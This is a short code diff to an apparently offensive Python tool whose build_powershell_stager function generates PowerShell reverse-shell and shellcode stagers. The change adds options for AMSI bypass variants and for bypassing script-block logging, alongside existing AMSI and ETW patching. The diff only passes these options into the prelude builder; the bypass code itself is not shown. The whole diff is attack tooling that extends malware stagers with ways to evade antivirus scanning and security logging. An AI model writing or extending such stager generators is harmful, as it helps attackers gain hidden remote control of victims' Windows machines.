@@ -92,11 +92,18 @@ def build_powershell_stager(
     lport: int,
     bypass_amsi: bool = False,
     patch_etw: bool = False,
+    amsi_variant: str = "",
+    bypass_scriptblock: bool = False,
     mode: str = "reverse_shell",
     shellcode: Optional[bytes] = None,
     gzip_encode: bool = False,
 ) -> str:
-    prelude = powershell_prelude(bypass_amsi=bypass_amsi, patch_etw=patch_etw)
+    prelude = powershell_prelude(
+        bypass_amsi=bypass_amsi,
+        patch_etw=patch_etw,
+        amsi_variant=amsi_variant or None,
+        bypass_scriptblock=bypass_scriptblock,
+    )
     if mode == "shellcode_stager":
         if not shellcode:
             raise ValueError("shellcode is required for shellcode_stager mode")
